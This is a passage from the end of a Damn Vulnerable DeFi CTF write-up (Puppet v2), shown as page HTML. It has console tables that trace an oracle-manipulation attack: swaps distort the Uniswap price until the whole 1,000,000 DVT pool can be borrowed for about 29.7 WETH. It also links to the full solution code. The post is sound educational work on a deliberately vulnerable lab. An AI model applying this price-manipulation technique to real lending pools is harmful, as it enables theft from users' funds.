+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>0) Initial setup
+</span></span><span style="display:flex;"><span>┌─────────┬───────────────┬───────────┬──────────────┬──────────────┬───────────────┬──────────────────┬──────────────┬───────────────┬──────────────────┐
+</span></span><span style="display:flex;"><span>│ (index) │   pool DVT    │ pool WETH │ pool balance │ attacker DVT │ attacker WETH │ attacker balance │ exchange DVT │ exchange WETH │ exchange balance │
+</span></span><span style="display:flex;"><span>├─────────┼───────────────┼───────────┼──────────────┼──────────────┼───────────────┼──────────────────┼──────────────┼───────────────┼──────────────────┤
+</span></span><span style="display:flex;"><span>│    <span style="color:#3af">0</span>    │ <span style="color:#5a2">&#39;1000000.000&#39;</span> │  <span style="color:#5a2">&#39;0.000&#39;</span>  │   <span style="color:#5a2">&#39;0.000&#39;</span>    │ <span style="color:#5a2">&#39;10000.000&#39;</span>  │    <span style="color:#5a2">&#39;0.000&#39;</span>    │     <span style="color:#5a2">&#39;20.000&#39;</span>     │  <span style="color:#5a2">&#39;100.000&#39;</span>   │   <span style="color:#5a2">&#39;10.000&#39;</span>    │     <span style="color:#5a2">&#39;0.000&#39;</span>      │
+</span></span><span style="display:flex;"><span>└─────────┴───────────────┴───────────┴──────────────┴──────────────┴───────────────┴──────────────────┴──────────────┴───────────────┴──────────────────┘
+</span></span><span style="display:flex;"><span>[+] Deposit required to borrow 1000000.0 DVT: 300000.000 WETH
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>1) swap all DVT <span style="color:#00f">for</span> WETH
+</span></span><span style="display:flex;"><span>┌─────────┬───────────────┬───────────┬──────────────┬──────────────┬───────────────┬──────────────────┬──────────────┬───────────────┬──────────────────┐
+</span></span><span style="display:flex;"><span>│ (index) │   pool DVT    │ pool WETH │ pool balance │ attacker DVT │ attacker WETH │ attacker balance │ exchange DVT │ exchange WETH │ exchange balance │
+</span></span><span style="display:flex;"><span>├─────────┼───────────────┼───────────┼──────────────┼──────────────┼───────────────┼──────────────────┼──────────────┼───────────────┼──────────────────┤
+</span></span><span style="display:flex;"><span>│    <span style="color:#3af">0</span>    │ <span style="color:#5a2">&#39;1000000.000&#39;</span> │  <span style="color:#5a2">&#39;0.000&#39;</span>  │   <span style="color:#5a2">&#39;0.000&#39;</span>    │   <span style="color:#5a2">&#39;0.000&#39;</span>    │    <span style="color:#5a2">&#39;9.901&#39;</span>    │     <span style="color:#5a2">&#39;20.000&#39;</span>     │ <span style="color:#5a2">&#39;10100.000&#39;</span>  │    <span style="color:#5a2">&#39;0.099&#39;</span>    │     <span style="color:#5a2">&#39;0.000&#39;</span>      │
+</span></span><span style="display:flex;"><span>└─────────┴───────────────┴───────────┴──────────────┴──────────────┴───────────────┴──────────────────┴──────────────┴───────────────┴──────────────────┘
+</span></span><span style="display:flex;"><span>[+] Deposit required to borrow 1000000.0 DVT: 29.496 WETH
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>2) swap all ETH <span style="color:#00f">for</span> DVT
+</span></span><span style="display:flex;"><span>┌─────────┬───────────────┬───────────┬──────────────┬──────────────┬───────────────┬──────────────────┬──────────────┬───────────────┬──────────────────┐
+</span></span><span style="display:flex;"><span>│ (index) │   pool DVT    │ pool WETH │ pool balance │ attacker DVT │ attacker WETH │ attacker balance │ exchange DVT │ exchange WETH │ exchange balance │
+</span></span><span style="display:flex;"><span>├─────────┼───────────────┼───────────┼──────────────┼──────────────┼───────────────┼──────────────────┼──────────────┼───────────────┼──────────────────┤
+</span></span><span style="display:flex;"><span>│    <span style="color:#3af">0</span>    │ <span style="color:#5a2">&#39;1000000.000&#39;</span> │  <span style="color:#5a2">&#39;0.000&#39;</span>  │   <span style="color:#5a2">&#39;0.000&#39;</span>    │ <span style="color:#5a2">&#39;10049.699&#39;</span>  │    <span style="color:#5a2">&#39;9.901&#39;</span>    │     <span style="color:#5a2">&#39;0.100&#39;</span>      │   <span style="color:#5a2">&#39;50.301&#39;</span>   │   <span style="color:#5a2">&#39;19.999&#39;</span>    │     <span style="color:#5a2">&#39;0.000&#39;</span>      │
+</span></span><span style="display:flex;"><span>└─────────┴───────────────┴───────────┴──────────────┴──────────────┴───────────────┴──────────────────┴──────────────┴───────────────┴──────────────────┘
+</span></span><span style="display:flex;"><span>[+] Deposit required to borrow 1000000.0 DVT: 1192751.934 WETH
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>3) swap all DVT <span style="color:#00f">for</span> WETH
+</span></span><span style="display:flex;"><span>┌─────────┬───────────────┬───────────┬──────────────┬──────────────┬───────────────┬──────────────────┬──────────────┬───────────────┬──────────────────┐
+</span></span><span style="display:flex;"><span>│ (index) │   pool DVT    │ pool WETH │ pool balance │ attacker DVT │ attacker WETH │ attacker balance │ exchange DVT │ exchange WETH │ exchange balance │
+</span></span><span style="display:flex;"><span>├─────────┼───────────────┼───────────┼──────────────┼──────────────┼───────────────┼──────────────────┼──────────────┼───────────────┼──────────────────┤
+</span></span><span style="display:flex;"><span>│    <span style="color:#3af">0</span>    │ <span style="color:#5a2">&#39;1000000.000&#39;</span> │  <span style="color:#5a2">&#39;0.000&#39;</span>  │   <span style="color:#5a2">&#39;0.000&#39;</span>    │   <span style="color:#5a2">&#39;0.000&#39;</span>    │   <span style="color:#5a2">&#39;29.800&#39;</span>    │     <span style="color:#5a2">&#39;0.100&#39;</span>      │ <span style="color:#5a2">&#39;10100.000&#39;</span>  │    <span style="color:#5a2">&#39;0.100&#39;</span>    │     <span style="color:#5a2">&#39;0.000&#39;</span>      │
+</span></span><span style="display:flex;"><span>└─────────┴───────────────┴───────────┴──────────────┴──────────────┴───────────────┴──────────────────┴──────────────┴───────────────┴──────────────────┘
+</span></span><span style="display:flex;"><span>[+] Deposit required to borrow 1000000.0 DVT: 29.673 WETH
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>4) borrow DVT
+</span></span><span style="display:flex;"><span>┌─────────┬──────────┬───────────┬──────────────┬───────────────┬───────────────┬──────────────────┬──────────────┬───────────────┬──────────────────┐
+</span></span><span style="display:flex;"><span>│ (index) │ pool DVT │ pool WETH │ pool balance │ attacker DVT  │ attacker WETH │ attacker balance │ exchange DVT │ exchange WETH │ exchange balance │
+</span></span><span style="display:flex;"><span>├─────────┼──────────┼───────────┼──────────────┼───────────────┼───────────────┼──────────────────┼──────────────┼───────────────┼──────────────────┤
+</span></span><span style="display:flex;"><span>│    <span style="color:#3af">0</span>    │ <span style="color:#5a2">&#39;0.000&#39;</span>  │ <span style="color:#5a2">&#39;29.673&#39;</span>  │   <span style="color:#5a2">&#39;0.000&#39;</span>    │ <span style="color:#5a2">&#39;1000000.000&#39;</span> │    <span style="color:#5a2">&#39;0.126&#39;</span>    │     <span style="color:#5a2">&#39;0.099&#39;</span>      │ <span style="color:#5a2">&#39;10100.000&#39;</span>  │    <span style="color:#5a2">&#39;0.100&#39;</span>    │     <span style="color:#5a2">&#39;0.000&#39;</span>      │
+</span></span><span style="display:flex;"><span>└─────────┴──────────┴───────────┴──────────────┴───────────────┴───────────────┴──────────────────┴──────────────┴───────────────┴──────────────────┘
+</span></span><span style="display:flex;"><span>[+] Deposit required to borrow 1000000.0 DVT: 29.673 WETH</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<p>You can find the complete code <a href="https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/master/test/puppet-v2/puppet-v2.challenge.js" target="_blank" rel="noopener noreffer ">here</a>.</p>
+<h2 id="4-references">4) References</h2>
+<ul>
+<li><a href="https://docs.uniswap.org/protocol/V2/introduction" target="_blank" rel="noopener noreffer ">The Uniswap V2 Protocol</a></li>
+</ul></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on October 13, 2022</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://dellalibera.github.io/posts/damnvulnerabledefi_09_puppetv2/" data-title="Damn Vulnerable DeFi - Challenge #9 - Puppet v2" data-via="_d3lla_" data-hashtags="Damn Vulnerable DeFi,CTF,Solidity,Blockchain"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://dellalibera.github.io/posts/damnvulnerabledefi_09_puppetv2/" data-hashtag="Damn Vulnerable DeFi"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://dellalibera.github.io/posts/damnvulnerabledefi_09_puppetv2/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/damn-vulnerable-defi/">Damn Vulnerable DeFi</a>,&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/solidity/">Solidity</a>,&nbsp;<a href="/tags/blockchain/">Blockchain</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/offensivevyper_07_metatoken/" class="prev" rel="prev" title="Offensive Vyper - Challenge 7 - Meta Token"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Offensive Vyper - Challenge 7 - Meta Token</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://dellalibera.github.io/about/" target="_blank">della</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/css/e2eb86.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
